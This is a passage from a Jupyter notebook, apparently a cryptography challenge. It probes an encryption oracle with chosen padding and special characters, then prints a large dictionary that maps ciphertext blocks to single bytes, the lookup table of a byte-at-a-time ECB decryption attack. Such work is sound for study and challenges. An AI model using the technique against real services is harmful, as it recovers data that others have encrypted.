b'\\x90', b'\\x8f', b'\\x8e', b'\\x8d', b'\\x8c', b'\\x8b', b'\\x8a', b'\\x89', b'\\x88', b'\\x87', b'\\x86', b'\\x85', b'\\x84', b'\\x83', b'\\x82', b'\\x81', b'\\x80', b'\\x7f', b'~', b'}', b'|', b'{', b'z', b'y', b'x', b'w', b'v', b'u', b't', b's', b'r', b'q', b'o', b'p', b'n', b'm', b'l', b'k', b'j', b'i', b'h', b'g', b'e', b'f', b'd', b'c', b'b', b'a', b'`', b'_', b'^', b']', b'\\x00', b'Z', b'[', b'Y', b'X', b'W', b'V', b'U', b'T', b'R', b'P', b'Q', b'O', b'N', b'M', b'L', b'K', b'S', b'J', b'G', b'H', b'I', b'F', b'E', b'D', b'C', b'B', b'A', b'@', b'?', b'=', b'>', b'<', b';', b':', b'9', b'7', b'8', b'6', b'5', b'4', b'3', b'2', b'1', b'0', b'/', b'.', b'-', b',', b'+', b'*', b')', b'(', b'&', b'%', b'#', b'$', b'!', b' ', b'\\x1d', b'\\x1f', b'\\x1e', b'\\x1c', b'\\x1b', b'\\x19', b'\\x18', b'\\x17', b'\\x16', b'\\x15', b'\\x14', b'\\x13', b'\\x12', b'\\x11', b'\\x10', b'\\x0f', b'\\x0e', b'\\x0c', b'\\x0b', b'\\t', b'\\x08', b'\\x07', b'\\x06', b'\\x05', b'\\x04', b'\\x03', b'\\x02', b'\\x01'])\n",
      "b'\\n'\n",
      "b'\\r'\n",
      "b'\\x1a'\n",
      "b'\"'\n",
      "b\"'\"\n",
      "b'\\\\'\n"
     ]
    }
   ],
   "source": [
    "input_dict = global_input_dicts[0]\n",
    "print(input_dict.values())\n",
    "\n",
    "for i in range(256):\n",
    "    if bytes([i]) not in input_dict.values():\n",
    "        print(bytes([i]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n",
      "b'\\xee\\xdc\\x99\\x8e\\x86\\\\rH\\x86\\x87`&\\xcf\\xe4\\xcap'\n"
     ]
    }
   ],
   "source": [
    "print(new_oracle(b\"a\" * 15 + b\"\\x00\"))\n",
    "print(new_oracle(b\"a\" * 15 + b\"\\n\"))\n",
    "print(new_oracle(b\"a\" * 15 + b\"\\r\"))\n",
    "print(new_oracle(b\"a\" * 15 + b\"\\x1a\"))\n",
    "print(new_oracle(b\"a\" * 15 + b'\"'))\n",
    "print(new_oracle(b\"a\" * 15 + b\"\\\\\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{b'P\\xae\\x9c:\\xb6\\xfdg\\xab6\\xef\\x00\\xa5\\xef\\xc9H\\xfe': b'\\xff', b'F\\xd7wT\\xc86}?\\xfe\\xa7\\xf8\\x15=\\xac)d': b'\\xfb', b'\\x9bQu\\xac\\x0b\\x13\\x13\\x7f\\x19\\xce}m\\xbc\\xf1\\xe8\\xb5': b'\\xfa', b'\\xc9B\\xfaVZ\\x9do8\\x12\\x8aX`+\\xbd\\x17\\x8c': b'\\xfd', b'v\\x95\\xa9\\x10,\\x9b\\x08_\\x7fe\\x7f\\xb8\\xb3\\xb3\\x01\\xd1': b'\\xf8', b'\\xec\\x08>\\xef\\xdbs`-mW\\x96\\xc6.\\xf0L\\x95': b'\\xfe', b\"\\xc4\\xfd\\xa2z\\xb4.V&/\\xbb\\xa5'\\xa0fc\\x9d\": b'\\xf9', b'0e\\xc5-\\xa4\\x1a\\x15N\\x92o\\x96\\xeen\\x18Y\\xcf': b'\\xf7', b'\\x9cML\\x8d<\\x18\\xaf3/\\xd1\\xb7/m\\x87p[': b'\\xf6', b'\\xa0\\x88\\xdcQ\\xd5?J\\xb6\\x00(.W\\x81\\xe7sb': b'\\xf5', b'\\x010F\\x93+\\x9ah\\xd6\\xfb\\x9c\\x08\\xf6}\\xfe? ': b'\\xf4', b'x\\x9a\\x98\\xfe\\x00T\\xa1\\xce\\xd5\\xf8\\x07v\\x0f>\\x98\\xdb': b'\\xf3', b'\\x0bIh\\xbf\\xb5\\x9e;\\x84\\xca\\x02\\xdb\\xce\\xbc\\x81\\xc7\\xf7': b'\\xf1', b'\\xb7S\\xef\\x19V\\xb6\\xf3\\xd2D\\xf6\\xc1\\xd4\\x08\\x8a\\x98\\xde': b'\\xf2', b'\\xd6\\x8d\\xa64^\\xbecC\\xb4*e\\xf4\\xe2-\\x92.': b'\\xef', b'/T\\x04\\x8a\\x0e.=\\xc7n\\xea\\xd2m~q\"\\x03': b'\\xf0', b'>\\xcf\\x85\\xe5y\\xf2 \\xef,n\\x88\\xce\\x1d\\x0e\\xb9X': b'\\xee', b'\\xe1\\xf9S=g\\xb4\\xe8\\x03K\\x9c=\\xa3\\xb5:\\x9b\\xff': b'\\xed', b'\\xae\\x0ca.\\x1f\\x9f\\xb6\\x004\\xe0\\xb6m\\x1a\\xa6\\x1d\\x07': b'\\xfc', b'#\\xa7p\\xbdu\\xf2\\xa0\\xa11d8\\xc6\"s\\x803': b'\\xec', b'\\xf5\\x0b\\xbb\\x12u\\x97D\\xeeN\\xe0\\xfd\\xbb\\x8d\\xfazC': b'\\xeb', b'h\\xce\\x81\\x81\\xc4!\\xe9\\x80z\\xb0\\xc9\\r\\xa4e\\xcd\\x9a': b'\\xe8', b'e9\\xe9\\x8b\\xb3\\x0e\\x93G\\xec`\\xc4\\x80\\xfe\\xffYR': b'\\xe4', b'N\\xeb\\x12\\xda\\xee\\xc8&\\x8b\\xb8\\xa2\\xcb\\xfe\\xaf\\xdd/\\x8e': b'\\xe9', b't\\xceX^_y\\x9cQ\\x1a\\x0f\\xbe\\x8e\\xe7\\xa3\\x06+': b'\\xea', b'\\x9c\\xce\\xa0\\xb2\\xab3\"\\xc0a\\xcd\\x96\\xd3\\xe9\\xb6\\x1c\\x15': b'\\xe7', b'\\xa7\\xb9\\xe8\\xe0\\x8bb+\\x13\\x03\\xa5\\x030\\xed\\x85\\xd8\\xd2': b'\\xe6', b'\\x0bxe\\x05N4\\x0e\\xd1\\x1cc\\xb4\\xe5\\xfd\\xcb\\x84\\x1f': b'\\xe5', b'\\xa3\\x00\\xedS\\xeeI\\x8d\\x8f\\x85Y\\xaf\\xc6\\xf2\\x06\\xac_': b'\\xe3', b'\\xca\\x9c4\\xc6\\xb3\\x0f\\x0c(\\xa3\\xb9LI.<[\\x1a': b'\\xe2', b'\\xc5\\x82+\\xef\\xc6\\x16\\x9c\\x19h{nd1 \\xe8\\x9c': b'\\xe1', b'\\x08\\xa4R\\x8dV4\\xd8\\x08\\xf1i=\\x8f \\xa4\\xe3\\x8b': b'\\xda', b\"\\xe9\\xe4{\\xdb\\x9e!\\xcd\\xed\\x0f)xM\\x9c'\\x8fj\": b'\\xdc', b'<\\xe4\\x9dZ\\x84\\xf9\\xb9\\x02\\x0f\\xcd2\\x00\\xb1H\\xd8I': b'\\xdd', b'\\xd1i\\xd8\\xb4R\\x8d\\xbe\\x87\\x9e\\xe3\\xd9\\xb5g/\\xf92': b'\\xde', b'\\xe1\\xa1\\xe7Y\\x98\\xf5.\\xdc\\xd3\\x86_R\\xa5\\x1b\\xd5\\xd7': b'\\xdb', b'-w\\x03\\xd3\\x9f\\xaa0&\\x8dvWT\\xbcO\\x84{': b'\\xe0', b'\\xe5\\x90\\xf0(4\\x16:S\\x87\\xc8Z\\xf9\\xe0pt\\xcc': b'\\xdf', b'o@\\xbb\\x1a\\xec\\x93\\x89n\\xdavN\\xe3\\xf0\\xa2\\x02-': b'\\xd9', b'7t<qv\\xcc\\xbf&K\\xbd\\xa3\\xc3MK\\x82\\xef': b'\\xd8', b'\\xe4S\\xa3HE\\xc0\\x9c\\x95bu8\\x9av\\xee1\\x10': b'\\xd7', b'\\xb1`1I?\\xa2\\xc0]\\x03}O\\x18\\xc3gs\\xaf': b'\\xd6', b'u\\xb9\\x99h+\\x84*\\x98\\xc41\\xd7f@\\xc9\\xb3\\xd8': b'\\xd4', b',\\x05\\xa4\\xa4F\\x7f\\xe3\\x11\\x89\\x88\\x86\\xcf2\\xd0Wj': b'\\xd5', b'\\x12\\xef\\xc9>\\x96W.\\x13U\\xb6\\x1b\\xcc\\x0e\\x0e}E': b'\\xd3', b'\\xad\\xd9\\xbc\\xb7\\xcb\\x9do6\\xben\\x8c\\xdb\\xa4*\\x8a\\x1c': b'\\xcf', b']\\\\\\xe8>u\\xcd\\xd3\\x8d\\xa3\\xeb\\xf0\\xae\\x1a\\xbf\\xa7v': b'\\xd2', b'\\xd0\\x17\\xbbm\\xe1\\x80\\xe7\\xfdY\\xd4\\xeaCIj\\xc3Y': b'\\xd1', b']\\xdd\\xe4SD2j\\xa2\\xca\\xbd`5\\xb7tg1': b'\\xd0', b'\\\\\\xa9:L\\xbd\\xb6\\x9dx#\\x98\\x88@\\xf4\\xaa\\x8c\\xc3': b'\\xce', b'\\xf5\\xc3\\x8b\\x80|1\\xf2\\xa5\\xbf\\x1e\\xdcM\\xb3j[|': b'\\xcd', b'P\\xf6\\xd29\\x1cH\\xd88\\xf3\\x02gU\\xd8\\x90\\xf6\\xea': b'\\xcc', b'\\x9f\\xb5\\xa4\\xcfC\\xa2\\xf3\\xba\\xe7%\\xdbf\\x8fh\\xb3\\x9f': b'\\xcb', b'\\xc7\\x95\\x8dG\\xa5\\xfb\\x14\\xc7\\xd0\\xe3\\xff\\xfeW\\xb7\\xd0\\x88': b'\\xc9', b'\\x87\\xfd\\x82kv\\x16\\x82\\xe4\\x87e\\xf0\\x83\\x1be\\xaa\\x9f': b'\\xca', b'\\x8a\\xe9\\xa0\\xa4|\\xf8\\xcc(3\\xb0\\x13\\xc2\\xa3\\x88;\\\\': b'\\xc6', b'\\xc8d\\xf3q\\xff\\x8c:\\xab\\x9d\\x84\\x95l\\x05\\xb5l\\xa9': b'\\xc8', b'\\tXhf\\x9eY\\xf2TR\\x18c\\\\Q\\xcf\\x19\\xc5': b'\\xc7', b'\\x90r)\\x1de\\x9c\\xfe^X6\\x06\\xef\\x8cq{\\x89': b'\\xc5', b\"\\xe6\\xff\\x12N\\x82\\x07'\\x12\\xa7\\x80\\xe8d\\xa8\\xcd\\x82\\x15\": b'\\xc4', b'\\xadz\\xba\\xa8SP4#\\x0b\\x1f\\xc04\\xd7\\xfa]\\n': b'\\xc3', b'\\xea\\x06\\xa2k\\xcek\\xb1\\x92\\xa0H+o\\xc5w\\x1a\\x86': b'\\xc2', b'\\xbdIA\\x02\\x95\\xbe\\xe2\\xf38\\xd4\\x0e\\x0c`\\xfa(\\xde': b'\\xc1', b'\\xa6o\\xae\\xea\\xfe$ \\x1dg\\x1e\\xe4\\xf1\\xad\\x95y\\x1f': b'\\xc0', b'F-\\x94\\x0cn\\xe4\\x1d\\x0f\\xf9\\xf6\\xf4\\xf8,8\\xbfV': b'\\xbf', b'mN\\xcb\\x98\\xaa~tS\\xe1(Sx\\x10\\xc9\\xca\\xb2': b'\\xbb', b'\\x9cF\\xc2\\xbe\\xd0\\x92v\\xe7\\xd9\\x01\\xc0\\xf6IO\\xeb\\x9d': b'\\xbd', b'i,\\xb8\\xff\\x0b\\xcb\\n\\x0f\\xab\\xf7~V\\x1c\\x86\\xa85': b'\\xbe', b'\\xfdmD(\\x86\\x95\\x9f\\xdb\\xcb\\xc8w\\xb0\\x1c\\xcc\\x0c\\xe0': b'\\xbc', b'>\\x9d\\xc1jPj\\xe6\\x0e\\xa7\\xd7\\xb6\\xa6\\xe5\\xfc\\xeb\\xd1': b'\\xba', b'\\x9e\\xce8g\\xb4\\xf8\\xfaS\\xd9;\\x84 \\x96\\xa5\\x1c+': b'\\xb9', b'\\x9eBHbW\\x1e\\xa7Fh\\xda\\x00v\\xe5\\x0fcd': b'\\xb6', b'\\xbbl\\t\\xf6\\x19PC\\xce\\x8b\\xa1Y\\xa1\\x94Y\\xcf\\x14': b'\\xb8', b'\\xb1z[\\x80\\x08\\x9a\\r\\xcf\\xa4e\\xc6\\xd1\\x19\\n\\x07\\xa6': b'\\xb7', b'N)7\\x15\\xce\\xa8\\xe2\\xcd\\xd5\\x00\\xfd\\x07\\x81(#\\xf0': b'\\xb5', b'\\xf8\\xc7Uo\\xe1\\xef\\x89\\xdc\\x99b\\x9a\\x08\\xb9m\\x10\\x0b': b'\\xb4', b'&V\\xdf\\x8c\\x81.;9y5AF\\x18z\\xe1\\xaa': b'\\xb1', b'\\x0e\\x9d\\x19u@L\\xcb\\xb1e\\xd4\\xd36Q\\xbb\\x87\\xf6': b'\\xb3', b']d\\xf6.4\\xb0\\xb1g\\xc38w\\xd5\\xd5\\xff~\\x9d': b'\\xb2', b'\\x14\\xa3~\\x17\\xd9\\x98b\\xe3\\xf3\\x84\\x1c\\x11^\\x89\\xd3\\xbe': b'\\xb0', b'jw;\\xff\\xc8\\x99t\\x1d\\x9b-\\xb0\\xbe\\x99\\x11\\x1b\\x88': b'\\xaf', b'\\x02\\x13%+\\xae\\xa0CC=\\xc3t8XQP\\x0f': b'\\xad', b'XE\\xa8L\\x80(l\\x02\\x1bbHz\\xf7%\\xda\\xc9': b'\\xae', b'\\xfeJ\\xe7%oq\\xf8\\xb7o+\\xee\\x90i|\\x1b\\x9b': b'\\xac', b'\\xad\\xd6\\x94\\xff{\\xd4v\\xe0\\xff\\xc4\\x07\\xb3\\r]_c': b'\\xab', b' \\xaf\\xd0\\xe8\\x91\\xfc\\x91]P :\\xeb\\xf4{[&': b'\\xaa', b\",:\\x80Q\\xf2\\xb1\\x17*O('sC\\xc3y#\": b'\\xa8', b'\\xff\\x06\\xaf\\xee\\xf8\\xd9\\xadrM\\xa2\\xf2X\\xd1C\\xc76': b'\\xa9', b'\\xe4\"\\\\q\\x95\\x10(\\x83\\x19z4\\x9c\\x84*\\x90\\xec': b'\\xa7', b'P-\\xcct\\x03[\\xd50.TD\\x1d\\xc4\\x9c\\xe3\\xb4': b'\\xa5', b'<\\xe1j\\x82\\xbb\\xcf\\xb0\\xbd\\x13W\\x86\\xb01\\\\\\t,': b'\\xa6', b'\\x8d\\x9b\\xab\\x92\\xd2X \\xad*\\n\\x0bG\\xdb\\xf9\\xf9\\xe3': b'\\xa2', b'\\x11\\x10\\xe5\\xd5\\xcd\\x04\\xa9\\x83i$\\x7f\\xe1\\x10\\xad?S': b'\\xa3', b'I\\xa0\\n\\nr9\\xc3\\xc6\\x82\\x9f|\\xddP#\\xa2\\x9d': b'\\xa4', b'`\\xba\\xe3\\xfe\\x9d\\x1c\\xdbS\\x169\\x8cry\\x06\\t\\xd4': b'\\xa1', b'\\\\\\x9d\\x0f\\xc8\\x8d\\xbe\\x1b\\xa4\\xb3\\x83\\rQ(\\xd3\\xbc\\xee': b'\\xa0', b'\\xf6L\\xd6\\x07\\x11\\x9cN)^4\\xb3\\xbc\\xdfE\\xa1\\x92': b'\\x9f', b'\\xe1^\\xb0\\xad\\x85\\x14R\\x00\\xceN\\xe2W\\xd5\\xe8\\x99z': b'\\x9e', b'\\x0fPs\\xe0\\xa1\\xcd\\x11\\xf1\\xcf\\xfb\\x00\\x01Q\\xa3FM': b'\\x9d', b'\\xaa\\x01o\\xbf\\xbcc\\xbe\\x88|\\x0eAp\\xd4\\xf7\\x1f\\n': b'\\x9c', b' H=\\t\"\\xacIN\\xb6\\xa0>:\\xc5\\x89=]': b'\\x9b', b'\\xc50U\\x85\\x15\\xa1\\x04\\\\\\xafZ\\x81mG\\xdeG\\xc9': b'\\x9a', b'\\x1a)ot\\xc3h\\x11M\\xb1\\xe1-\\x973$bv': b'\\x99', b'5\\\\Pp\\xab|j\\xdd\\xa3\\x85%v\\xde\\xed\\r\\x8e': b'\\x97', b'\\xca\\xd8\\xe5\\x8e\\xdd\\xdc\\xaaj\\x99@\\x18u\\x0b\\x90\\x8d\\x91': b'\\x96', b'e\\x1e\\x9c^\\xf2\\x02g\\x83\\x80\\x9f\\xfeOy\\x85\\xeb<': b'\\x95', b'\\x1e\\x11\\x05X;\\x8br\\xcb\\xb6\\xd6\\xf0\\x8a\\x96\\xec]\\xa6': b'\\x94', b'\\xfb\\xbf;\\xec\\x14\\x80i\\x82\\r\\xc4\\x05\\xab\\xde\\x17y>': b'\\x93', b'e\\xbb\\xaf\\xeb\\x07b\\x93\\xe3V\\xa1\\xf9gn2\\xbd\\xda': b'\\x92', b'.\\xb2\\x8bu\\x8d\\x10o\\x96\\xf5\\xb7\\x06\\x00\\xef0>o': b'\\x91', b'h\\x1b\\x15\\xda\\x9f\\xc3\"\\x13hK\\xfd\\xf9\\xf6\\xf6QU': b'\\x8f', b'\\xddg\\x03U\\xcb\\x1a\\xda\\xba\\xd2\\xf8o\\xc2\\x9a\\xff\\xfeU': b'\\x90', b'2\\xd18\\x1d*\\xe4\\x88\\x9e\\x032\\xf0\\xf5\\x06\\x12\\x0bh': b'\\x98', b'\\xa1\\x12\\x12\\xca\\xd6n\\xd8P@\\x83b\\xbe\\xfbQTi': b'\\x8e', b'\\x8f\\xf8\\x84:7:\\xe4K\\xbf5<v\\x10\\x153\\x07': b'\\x8d', b'\\x0bS\\x83\\xe8\\x90\\xf8\\xb8V\\xe2=t\\xfdix\\x9e\\xbd': b'\\x8c', b\"\\x19$'u\\xb8\\xb4\\xee\\xf1\\xd5\\xeb\\xe1\\x0f\\xf4\\xd0A\\xe7\": b'\\x8a', b'j\\x8aN\\x98\\x1d\\xa4\\x11\\x92r\\xbb\\x8a\\xdeK|}\\xfa': b'\\x8b', b'\\xd2\\xdbg\\xe3\\x02*\\x03\\xb0\\x85\\x17\\x01\\x14.\\xc6ux': b'\\x89', b'\\xaa\\xc4)D\\xfe\\xfa\\xef\\xbfv\\x7f]\\xc1o\\x10K\\xe2': b'\\x88', b'-v\\x8e/\\x174\\x00=\\xaeV\\x8e\\xab\\xcd\\x95\\xa7\\xfd': b'\\x87', b'(\\x8eBH\\x1c\\x01\\x14\\x97\\xdbK\\x84>2\\xd8\\xa8\\x1b': b'\\x86', b'\\xdf\\xea\\xdf\\xdf\\xcd\\xe6\\x95I\\xaa\"\\n\\xe8\\x8dO\\xdc\\x16': b'\\x85', b'Q\\xf9s<\\xde>\\x9d\\x86\\xb4i>\\x84\\x8eT\\xab\"': b'\\x83', b'\\x07\\x9f8[wt\\x07)uU\\xcf\\xab:\\xe4\\xf3\\xd4': b'\\x84', b'?\\x1d\\x0c\\xa8zX\\x9daq_\\xa4\\xda\\xef\\xe0++': b'\\x82', b'\\x83\\xb0\\xa5\\xcc\\x14+\\x91\\xdeo7g0\\x0e\\xc6\\xe8#': b'\\x81', b'G?\\xcf\\xea\\x1d\\x9c\\xcf\\xb5\\xdf:e\\x7f\\x80D4-': b'\\x80', b'\\x0e>g\\xc4\\x98\\x1e\\x99;\\xeas\\xf7\\xbbf\\xb6\\xb6H': b'\\x7f', b'\\x8fM\\xdd*|2\\x9a\\x8c\\xbc\\xf3\\x93\\xf0J\\x8elJ': b'~', b'VhV\\x061\\xb3\\xdc\\xa5+/\\\\\\xc2/\\xf3\\xd0m': b'}', b'\\xda\\x91\\x9e,\\xc6i;\\xbd\\xa4\\xd4\\xc9\\x99\\xc6Y\\xef\\x94': b'{', b'\\x88\\x8bCD}R\\xa4\\xb8T\\xba\\x1e!\\x04\\xda\\x85\\xc6': b'|', b'Q0\\xb9\\xcfqw\\xe92\\xc4\\xef\\x9a\\x18FmQk': b'z', b'\\xd6\\xf3ldb\\x86\\xf2\\xb24]\\xea`\\xf7\\x98\\xba\\xc7': b'y', b'\\xa6(\\xf2\\xde\\xfc\\xcbm@F\\x8f\\xce\\x01\\x8f\\x89\\x96z': b'x', b'j[\\xd2\\x880\\xf6Z\\x00\\x85K\\xd4\\x89\\x15\\xc3\\xe5\\xaf': b'w', b'\\xf8\\xc6\\xcd\\r\\xd0\\x88+\\xc7\\xbci\\x18=%Xj\\n': b'v', b'\\xcd\\x08e\\xc3\\x8f\\x0e[\\xf1=:\\x97\\x92\\xd5sd\\xb0': b'u', b'z\\xa4\\xa6\\xe4\\x10\\xe4}f\\x8fW\\xc2\\xcc\\x01H\\r3': b't', b'\\r\\x1b\\x81\\xe0v\\xd7T\\r\\x87\\x94\\x19-\\xc5k\\xfa\\xfa': b's', b'\\xb3\\x93\\x17\\xad\\xb5\\xb3\\xd23\\xe4\\xc6\\xfa\\xf7y\\tJU': b'r', b'\\xc6\\x86\\xf5\\x0e\\x84\\xaeM\\x07\\xd8\\xf2\\x1bY\\xc0=2\\x9c': b'q', b'\\xb5\\xe9\\xac\\x0fF.\\xfc\\xab\\xd6\\x19Gt1h\\x92\\xd5': b'p', b'\\xff\\x8b\\x0f\\xd4#\\x88O\\x14Ut\\x80\\x84N\\x18C\\x8c': b'o', b'\\x03\\xed\\xd5W>\\xd8\\xaa!\\x00\\xdc\\xd5T\\x9bG\\xcf\\xf0': b'n', b'\\xf3,M\\x81\\xf9\\x87\\xde\\xb2\\x1f\\xe2\\xbfSK\\xe2\\xb7j': b'm', b'\\x84f\\xe7z\\xc1\\xb9\\xee\\xaex+\\xbdicW\\xad\\xa0': b'l', b'\\x05\\x01\\x97\\x9d\\xa7\\x0f\\x0f\\t\\xe5!\\x01PfY\\xef\\xa5': b'k', b'|\\xa0!\\x99\\xb9>\\xf0\\xcf\\x07Fo\\x99\\xe9\\x89\\xa0\\xa9': b'j', b'>d\\x1e>\\xacH\\x00+\\xe6\\xcfP\\xfe(3\\xc0\\x02': b'i', b'\\xd3\\x01\\xbd\\xdb)\\xd6\\xa5\\xcb\\xfd\\x9c;\\xce\\xa2\\x19P\\xb7': b'g', b\"\\xcb\\x11\\xf8\\xd0\\xc6\\xc7F\\xb1\\x96\\xd7)'\\xd3OG^\": b'h', b'\\x88\\x85g\\xf07\\x8a\\xf8\\x16\\x08N\\xb0\\xc8\\x8f\\xbe\\x11\\x0f': b'e', b'\\xc4z\\xee\\xdbmWB\\x04U\\xc4\\x9d\\x10\\x18o\\x8d2': b'f', b\"'i\\x13iE\\x81\\x1e\\x1f9\\xf5\\x8d\\x1aM:O\\x03\": b'd', b'\\xa6\\xf1\\xaf\\xb4\\xd2\\xac\\xf2\\x8bD\\xdc(\\xa4\\xaf\\xbaD\\x95': b'b', b'\\xa4\\xff%\\x88\\xe8\\xd6\\x9e2\\xbf\\xdd\\x1f\\x12\\xac\\n`.': b'c', b'\\xfa\\xdc\\xea\\x07L\\xceI\\x9a\\x85\\xbb:~\\xfev\\xe4\\x9a': b'a', b'\\x11\\xcaV\\xf3\\'\\xe1#\\x15+\\xb3V\\xac\"#\\x8e\\x14': b'`', b'8s\\x8f\\xc3\\x8bv\\xb6NiD\\xaf\\xfc\\xc9\\x18\\x8f\\xd2': b'_', b'\\xfb\\x10\\xb7\\x1e\\xf4\\x8ei\\xd7\\x9f&\\x9e\\xd32;q ': b'^', b'\\x02\\x88\\x020x\\xf6\\xe21\\xf8i\\xf4\\x92J\\xc9w\\xa3': b']', b'\\xa3d\\xb4\\x80\\x9a\\x11$8\\x8c\\xd5>\\x1es\\xedH`': b'[', b'G\\xb8\\x1b\\xdd\\x91\\x8d7\\x91%P\\x1e\\x88\\x91\\xab\\xf7\\xa9': b'\\x00', b'K\\xd4c\\x8aU{\\xa0h\\xa5M\\xa9\\xea\\x95\\xd7v\\x04': b'Z', b'\\x05p\\t\\x90\\xfc>\\x88[\\xb7H\\xf7\\x17\\xa6\\x8f\\t\\xe5': b'X', b'}gvs\\x882\\t\\xad\\xd7\\xec\\x83G\\xc2\\xf0\\xbd\\xd3': b'Y', b'y\\x03%Ju\\x88\\x83\\xba^\\xfe\\xb2\\x99\\xf1\\xffv\\xb0': b'W', b'\\xb2\\xe4\\xd5\\xb8_\\xe8\\x8f\\xf9\\xe9\\x0e\\xb9_}25\\x15': b'V', b\"\\xackd\\np-<,\\x15\\xe6\\x05\\x99\\xb8\\x8d'\\x84\": b'U', b'K\\xc6\\xa1}\\xe9\\xe9z\\xeb\\xda%Y\\xf15\\xf4$6': b'T', b'\\xb2\\xd3\\x92\\xca\\xa6\\xd3\\xff\\xc8\\xf5\\xc1\\xc7+\\xc9\\xd8\\xee\\xe0': b'S', b'\\xf4\\xd5\\x97[\\x07\\xff\\xcc\\xd5B\\x81KY=\\xbe\\xd6~': b'R', b'\\x93=\\xd0\\xb7\\x02\\xe4\\xa7\\xc8\\xca\\xe4\\x9ac\\x98Z\\xb6\\xe3': b'Q', b'\\x0c`Uq5\\x80\\x83\\xa0\\\\>\\xb7\\xbb\\xadg|\\xe0': b'P', b'\\xf9]7\\x9d\\xfa\\x0fL\\xd0\\x8f\\xcfI\\xc2\\xc9\\x8d\\xaf\\x1e': b'N', b'J0\\xd5K\\xec\\xc4\\xd1\\xa5\\xaa\\xed\\x94{D\\\\c\\x07': b'O', b'\\xf4X\\x90\\xd9\\xfe\\xea\\xf9\\x1f\\x05\\x9f\\x85\\r\\xd7\\r\\x01C': b'M', b'2\\xdb\\xdd\\x9b\\xbf=S\\xe4r6\\xea\\x1c~x\\xf4\\xbe': b'L', b'\\xe98\\xdf#\\xc3w\\xdc\\x89\\x80\\x0b\\x10f1\\xed\\xbf\\xa7': b'K', b'\\x85\\xfa\\x13~\\x9d!d\\x9bQ\\x97Y,\\x82t\\x7f^': b'J', b'\\xd7\\\\\\xec\\xdej\\xb2$Ofy\\xfc\\xc0\\x7f\\x1br\\\\': b'I', b'Y\\x17W\\x1e\\xa5M\\r\\xd7O4a\\xfb\\x12$\\x9b\\xb8': b'H', b'\\xba\\x14cN\\xcd;\\x80J\\xc49\\xdf\\xb9c;\\x16%': b'G', b'\\xed\\xb2\\xe4\\x8d<\\xb8\\xdaE\\xaa\\xb2\\x8b$\\x8bj\\xa65': b'F', b'5\\x16Fd\\x89\\xac\\xc0\\x8d%\\x96\\x004\\xce\\xbe\\x9e\\xf0': b'E', b'\\xf1%}\\x8faiE\\x7f\\xfb\\x16\\x91\\xd7\\xf0\\xaes\\x97': b'D', b'9\\xc3\\x04\\x1c\\xa1V>\\x81\\xa1@\\xd9;\\x88\\x1b\\xa4\\x97': b'C', b'R\\x85\\xc1\\xeam\\x8d@\\x82\\xd7>\\xf3\\xf8\\xec\\xc4\\x15^': b'B', b'M\\xbf\\x9b\\xde\\xf7Q\\xd9\\x115\\xde^IJ\\xab\\xd3T': b'A', b'\\x134=}\\x04rf.\\xb2\\xb6\\x03\\x82\\x86~r\\xb6': b'@', b'\\x92\\x8a\\x19x`\\t |\\x16\\xd0\\x0bw\\xa5KX{': b'?', b'\\xd5\\xcc\\x0f\\xd5bI\\x83\\xde\\xad\\x99\\xf4\\x0b\\xf2\\x889\\xe8': b'=', b'\\x17\\x83\\xb9\\xc9J/\\xf8oum?\\x1e/\\xb6\\x12\\xcc': b'>', b'\\xc8U\\x9c\\xd1\\xe0\\xde<\\xb49\\xec\\xf8\\x07_QmD': b'<', b'\\x93\\x06}K\\x08\\x16 R\\xb3\\xe7\\x0e\\x8a\\x88\\xc5n~': b':', b'8\\x96|\\x9b\\xf2\\x87Re\\xa22\\xd6/\\xd6\\xe8\\x93\\xcd': b';', b'\\x18\\x9b\\xc3\\x07#\\x17\\xbcEx\\xee\\xb7\\xea\\x1ct9\\\\': b'8', b'\\xbe\\x89\\x11\\x01T\\x8aQ\\x10*\\xd8;\\xce\\x12\\x11\\xf4n': b'9', b'a\\xc3X\\xf0o\\x8d\\x1fB\\x06\\x06k`L\\xd5k\\t': b'7', b'Zt\\xecr,`\\xd1\\xda,\\xb0\\t\\xf5\\x98f\\xd0\\xd4': b'6', b'c\\xc8\\xaa:\\xa3/\\x91\\xce\\x9f\\xc2\\xef\\xbdt\\xd1\\xcc\\xea': b'5', b'/\\xa4*\\r#oc\\t\\xb2\\x03\\xfcR\\x16?\\x8fD': b'2', b';\\x06\\x9fx\\xaf\\x0b\\rcP\\xc7\\xf3\\x8eE\\xd1\\x1c\\x02': b'3', b'6\\xefo\\xe4\\n\\x80\\x15o\\x00\\xfb\\xf2\\x9d\\x12\\xea0E': b'1', b'\\xcbM\\x00\\xba\\x1f\\x01\\x81\\xf7M\\xce|:t,}\\xf0': b'0', b';C\\xea\\xbe:\\xe5&\\xbdR\\x06\\xf6\\x9c\\x9c\\x06=\\x86': b'/', b'\\xa6#\\xe1\\xa3\\xd8L\\xacl\\x97\\x96\\xe3s`\\x88Z\\xa1': b'.', b'2\\x8fX\\x12\\xa0(x\\x7f\\x9e\\x0f\\xc97\\x17w\\x04@': b'-', b'\\xc8n\\x95\\xd4\\xf5\\xf4\\xc3\\xc9\\x12\\xceN\\xa8\\x0e\\x00\\x13S': b',', b'x\\x89\\xa2|q\\xa7/\\xf0\\xf6\\x1aC\\xf3%\\xc8\\xaa)': b'+', b'v\\x00\\xd6\\xb1{\\x12\\x87za0o~\\xe6\\xbcR\\xf6': b'*', b'\\xbd\\xf7\\xca\\x8ar\\x89\\x9a\\xce\\x07\\xfc$qS%\\xbc\\x12': b')', b'\\x92\\x89\\x8b\\xfb\\xd5\\xea\\xd4\\xf0Q\\xb0\\xeb\\xa8\\xe7\\xedHw': b'4', 